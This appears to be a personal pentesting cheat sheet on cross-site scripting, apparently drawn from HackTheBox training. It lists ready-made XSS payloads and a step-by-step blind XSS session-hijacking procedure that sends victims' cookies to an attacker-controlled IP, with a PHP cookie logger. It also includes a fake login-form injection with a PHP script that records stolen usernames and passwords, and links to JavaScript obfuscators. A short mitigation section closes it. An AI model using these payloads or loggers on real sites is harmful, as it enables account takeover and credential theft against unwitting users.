
1. **DOM-based (Non-Persistent) -** directly in the browser (e.g. through client-side HTTP parameters or anchor tags). Processed on client-side.
	1. Input parameter in the URL using a hashtag `#` means that this is a client-side parameter that is completely processed on the browser, `DOM-based XSS`.
2. **Reflected (Non-Persistent) -** Displayed on the page after being processed by backend server, without being stored (e.g. search result or error message.) Phish with URL, hosting malicious XSS javascript payload or XSS in URL parameter, etc. 
3. **Stored (Persistent) -** Most critical. User input is stored on the back-end database and then displayed upon retrieval (e.g. posts or comments)

## Commands

| Code                                                                                          | Description                       |
| --------------------------------------------------------------------------------------------- | --------------------------------- |
| **XSS Payloads**                                                                              |                                   |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |
| `<plaintext>`                                                                                 | Basic XSS Payload                 |
| `<script>print()</script>`                                                                    | Basic XSS Payload                 |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
| `src='" onerror=alert(window.origin)> <br"`                                                   | Inspect source to fix payload     |
| **Commands**                                                                                  |                                   |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
| `sudo php -S 0.0.0.0:80`                                                                      | Start `PHP` server                |
- https://github.com/payload-box
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
---

## Detect XSS
```bash
# New Tool
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"

# Alt Tool
git clone https://github.com/epsylon/xsser.git
sudo pip3 install pycurl bs4 pygeoip PyGObject selenium ddgs fpdf2
cd xsser
python3 setup.py
python3 xsser
python3 xsser -u "http://SERVER_IP:PORT/index.php?task=test"

# Old Tool
https://github.com/rajeshmajumdar/BruteXSS
```

## Basic
```javascript
<script>alert("Hi")</script>
```

```javascript
<script>print()</script>
```

```javascript
<script>alert(document.cookie)</script>
```

```javascript
<script>alert(window.origin)</script>
```

### Writing DOM Objects
```javascript
document.write();
document.write('<h3>Please login to continue</h3><form action=http://10.10.14.82><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```


```javascript
DOM.innerHTML
```
- `innerHTML` will not allow the use of `<script>` but allows others...

```javascript
DOM.outerHTML
```

```javascript
add()
```

```javascript
after()
```

```javascript
append()
```

```javascript
<img src="" onerror=alert(window.origin)>
```

```javascript
<script src="http://OUR_IP/script.js"></script>
```


```javascript
<img src=1 onerror=\"document.location='http://10.10.16.47:8000/'+document.cookie\">
```
## Blind XSS -to> Session Hijacking
1) `mkdir /tmp/tmpserver && cd /tmp/tmpserver && sudo php -S 0.0.0.0:PORT`
2) Find Vulnerable Parameter (Burp Intruder with URL Payload Processing to encode if needed)
*Examples of Blind XSS Payloads - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss*
```html
<!-- Examples to try (put into burp payload positions) -->
<script src=http://OUR_IP:PORT/field1-test1></script>
'><script src=http://OUR_IP:PORT/field1-test2></script>
"><script src=http://OUR_IP:PORT/field1-test3></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP:PORT/field1-test4\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP:PORT/field1-test5");a.send();</script>
<script>$.getScript("http://OUR_IP:PORT/field1-test6")</script>

<!-- other examples -->
<script src=http://OUR_IP:PORT/fullname></script> # full-name field
<script src=http://OUR_IP:PORT/username></script> # username field
<script src=http://OUR_IP:PORT/password></script> # password field -- not vulnerable bc usually hashed
<script src=http://OUR_IP:PORT/email></script> # email field -- not vulnerable bc it must match email format
<script src=http://OUR_IP:PORT/imgurl></script> #this goes inside the imgurl field
```

3) Create `script.js` to POST cookie

```javascript
new Image().src='http://10.10.14.82:8767/index.php?c='+document.cookie;
// or
document.location='http://10.10.14.82:8767/index.php?c='+document.cookie;
```

4) Start PHP server, two methods. 
	1) Simple: `php -S 0.0.0.0:8767`
	2) Script to log cookies, save as `index.php`, then run `php -S 0.0.0.0:8767:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['VICTIM_IP']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
// replace Victim IP with target IP of web server
```

5) Send the XSS payload in the vulnerable field discovered in step 1 `script src=` in vulnerable parameter, e.g.:

```javascript
field3="><script+src%3dhttp%3a//10.10.14.82%3a8767/script.js></script>
```

6) With the cookie, add it in Storage in browser on `login.php` and refresh for session hijacking 


## Defacing/Credential Stealing with XSS
```javascript
// Change Background
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

// Change Title
<script>document.title = 'HackTheBox Academy'</script>

// Change Page Text
document.getElementById("todo").innerHTML = "New Text" // specific element
$("#todo").html('New Text'); // jQuery function to change specific element
document.getElementsByTagName('body')[0].innerHTML = "New Text" // Change the whole body

// Minify the code and add to XSS payload, e.g.:
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cartman says hi!</h1><p style="color: white"><img src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/cartman.svg" height="25px" alt="Cartman"> </p></center>'</script>

// Login Form Injection & Credentail Stealing
<img src="" onerror=document.write('<h3>Please login to continue</h3><form action=http://10.10.14.82:8080><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form><img src="" onerror=document.getElementById('urlform').remove();> <!--

sudo nc -lnvp 8080 // Catch with nc
<?php // Catch with PHP script to forward victim to legit site:
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
sudo php -S 0.0.0.0:8080
```

---

## Deserialization + XSS

https://www.toptal.com/developers/javascript-minifier
https://beautifytools.com/javascript-obfuscator.php#
https://obfuscator.io/legacy-playground

### JS Obfuscated XSS:
https://jsfuck.com/ 
https://utf-8.jp/public/jjencode.html
https://utf-8.jp/public/aaencode.html

Test obfuscated code in: https://jsconsole.com/

---
## Mitigations / Remediations

#### Front-end
1. Input Validation
```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```
2. Input Sanitization - [DOMPurify](https://github.com/cure53/DOMPurify)
```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```
3. Direct Input
```html
<!-- Vulnerable HTML tags -->
JavaScript code <script></script>
CSS Style Code <style></style>
Tag/Attribute Fields <div name='INPUT'></div>
HTML Comments <!-- -->
```

```JavaScript
// Vulnerable JavaScript functions
DOM.innerHTML
DOM.outerHTML
document.write()
document.writeln()
document.domain
```

```JavaScript
// Vulnerable jQuery functions
html()
parseHTML()
add()
append()
prepend()
after()
insertAfter()
before()
insertBefore()
replaceAll()
replaceWith()
```

#### Back-end
1. Input Validation
```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```
2. Input Sanitization
```php
addslashes($_GET['email'])
```

```JavaScript
// For NodeJS Backend, we can use the same method as Front-end: https://github.com/cure53/DOMPurify
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```
3. Output HTML Encoding
```php
htmlentities($_GET['email']);
```

```JavaScript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```